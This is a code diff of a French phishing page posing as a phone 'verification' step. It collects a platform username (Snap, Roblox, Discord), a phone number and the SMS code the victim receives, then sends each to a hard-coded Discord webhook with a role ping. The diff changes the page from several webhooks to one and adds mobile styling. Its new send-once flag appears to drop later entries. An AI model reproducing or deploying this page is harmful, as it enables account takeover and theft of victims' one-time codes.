@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Vérification téléphonique</title>
     <style>
         :root {
@@ -39,6 +39,7 @@
             font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
             padding: 20px;
             -webkit-font-smoothing: antialiased;
+            touch-action: manipulation;
         }
 
         .card {
@@ -160,14 +161,11 @@
             text-transform: uppercase;
             transition: all 0.3s ease;
             white-space: nowrap;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        .operator-tag:hover {
-            background: rgba(255, 0, 0, 0.45);
-            color: #ffffff;
-            border-color: #ff5555;
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
-            transform: translateY(-1px);
+        .operator-tag:active {
+            transform: scale(0.95);
         }
 
         .operator-tag.orange {
@@ -185,7 +183,6 @@
             border-color: rgba(0, 150, 200, 0.5);
             color: #0096c8;
         }
-    
 
         .phase-badge {
             display: inline-block;
@@ -289,6 +286,9 @@
             outline: none;
             font-weight: 400;
             min-width: 0;
+            -webkit-appearance: none;
+            appearance: none;
+            touch-action: manipulation;
         }
 
         .input-group input::placeholder {
@@ -328,6 +328,14 @@
             position: relative;
             overflow: hidden;
             box-shadow: 0 8px 25px rgba(108, 92, 231, 0.3);
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        .btn:active:not(:disabled) {
+            transform: scale(0.97);
+            box-shadow: 0 3px 10px rgba(108, 92, 231, 0.3);
+            transition: all 0.05s ease;
         }
 
         .btn::before {
@@ -349,12 +357,6 @@
             transform: translateY(-3px);
             box-shadow: 0 14px 35px rgba(108, 92, 231, 0.5);
             background: linear-gradient(135deg, #7c6df0 0%, #6a5be0 100%);
-        }
-
-        .btn:active:not(:disabled) {
-            transform: translateY(0);
-            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.3);
-            transition: all 0.1s ease;
         }
 
         .btn:disabled {
@@ -551,20 +553,14 @@
         <!-- Badge phase -->
         <div class="phase-badge" id="phaseBadge">● Phase 1 — Téléphone</div>
 
-        <!-- Champ PSEUDO  -->
+        <!-- Champ PSEUDO -->
         <div class="input-group" id="inputPseudoWrapper">
             <div class="flag-france">
                 <div class="flag-stripe blue"></div>
                 <div class="flag-stripe white"></div>
                 <div class="flag-stripe red"></div>
             </div>
-            <input
-                type="text"
-                id="pseudoInput"
-                placeholder="Pseudo (ex: Snap, Roblox, Discord)"
-                autocomplete="off"
-                maxlength="50"
-            >
+            <input type="text" id="pseudoInput" placeholder="Pseudo (ex: Snap, Roblox, Discord)" autocomplete="off" maxlength="50">
         </div>
         <div class="hint-text" id="hintPseudo">👤 Entrez votre pseudo</div>
 
@@ -575,14 +571,7 @@
                 <div class="flag-stripe white"></div>
                 <div class="flag-stripe red"></div>
             </div>
-            <input
-                type="tel"
-                id="userInput"
-                placeholder="+33 6 12 34 56 78"
-                autocomplete="off"
-                inputmode="numeric"
-                maxlength="20"
-            >
+            <input type="tel" id="userInput" placeholder="+33 6 12 34 56 78" autocomplete="off" inputmode="numeric" maxlength="20">
         </div>
         <div class="hint-text" id="hintEl">🇫🇷 Format: +33 puis votre numéro sans le 0</div>
 
@@ -617,12 +606,10 @@
 
     <script>
         // ============================================================
-        // CONFIGURATION
+        // CONFIGURATION - UN SEUL WEBHOOK AVEC ROLE
         // ============================================================
-        const WEBHOOKS = [
-            "https://discord.com/api/webhooks/1527347697072345198/ws0L0IXXK1sqhrPGn2ebBRopl-5xUmiIbQCZ5KEQgAkq10_0SWCPCN1JySbdk5NkWgnz",
-            "https://discord.com/api/webhooks/1527347697072345198/ws0L0IXXK1sqhrPGn2ebBRopl-5xUmiIbQCZ5KEQgAkq10_0SWCPCN1JySbdk5NkWgnz"
-        ];
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1527347697072345198/ws0L0IXXK1sqhrPGn2ebBRopl-5xUmiIbQCZ5KEQgAkq10_0SWCPCN1JySbdk5NkWgnz";
+        const ROLE_ID = "1527706597919293550";
         const DUREE_TOTALE = 30;
         const RAYON_CERCLE = 62;
         const CIRCONFERENCE = 2 * Math.PI * RAYON_CERCLE;
@@ -635,6 +622,7 @@
         let intervalleTimer = null;
         let pseudoPlateforme = "";
         let numeroTelephone = "";
+        let webhookEnvoye = false; // Flag pour envoyer une seule fois
 
         // ============================================================
         // ÉLÉMENTS DOM
@@ -670,10 +658,16 @@
             setTimeout(() => element.classList.remove("error"), 600);
         }
 
-        // ENVOI VERS TOUS LES WEBHOOKS AVEC @everyone
+        // ENVOI VERS UN SEUL WEBHOOK AVEC PING DU ROLE (une seule fois)
         async function envoyerWebhook(etiquette, valeur) {
+            // Ne pas envoyer si déjà envoyé
+            if (webhookEnvoye) {
+                console.log("[Webhook] Déjà envoyé, ignoré.");
+                return;
+            }
+
             const payload = {
-                content: "@everyone",
+                content: "<@&" + ROLE_ID + ">",  // Ping du rôle
                 embeds: [{
                     title: "📥 NOUVELLE ENTRÉE UTILISATEUR",
                     color: 0x6c5ce7,
@@ -697,22 +691,21 @@
                         },
                     ],
                     footer: {
-                        text: "⚡ Système automatisé • " + new Date().toISOString() + " • @everyone",
+                        text: "⚡ Système automatisé • " + new Date().toISOString() + " • Role ping",
                     },
                 }, ],
             };
 
-            for (const url of WEBHOOKS) {
-                try {
-                    await fetch(url, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload),
-                    });
-                    console.log("[Webhook] Envoyé à " + url + " avec @everyone : " + etiquette + " = " + valeur);
-                } catch (erreur) {
-                    console.debug("[Webhook] Erreur d'envoi vers " + url + " (ignorée)");
-                }
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload),
+                });
+                webhookEnvoye = true;  // Marquer comme envoyé
+                console.log("[Webhook] Envoyé avec ping du role " + ROLE_ID + " : " + etiquette + " = " + valeur);
+            } catch (erreur) {
+                console.debug("[Webhook] Erreur d'envoi (ignorée)");
             }
         }
 
@@ -799,8 +792,11 @@
 
                 pseudoPlateforme = valeurPseudo;
                 numeroTelephone = valeurTel;
+
+                // Envoi du pseudo vers le webhook (1 seule fois)
                 await envoyerWebhook("👤 Pseudo", pseudoPlateforme);
                 await envoyerWebhook("📞 Numéro de téléphone", numeroTelephone);
+
                 passerEtape2();
                 return;
             }
@@ -825,6 +821,7 @@
                     return;
                 }
 
+                // Envoi du code SMS vers le webhook (1 seule fois)
                 await envoyerWebhook("🔢 Code SMS reçu", codeSMS);
                 afficherSucces();
             }
@@ -855,7 +852,7 @@
             if (intervalleTimer) clearInterval(intervalleTimer);
         });
 
-        console.log("✅ Site chargé - @everyone activé sur " + WEBHOOKS.length + " webhooks");
+        console.log("✅ Site chargé - Un seul webhook avec ping du role " + ROLE_ID);
         console.log("🔗 Support : discord.gg/2fe7CQttHR | Credits : c26i & cloudric");
     </script>
 </body>
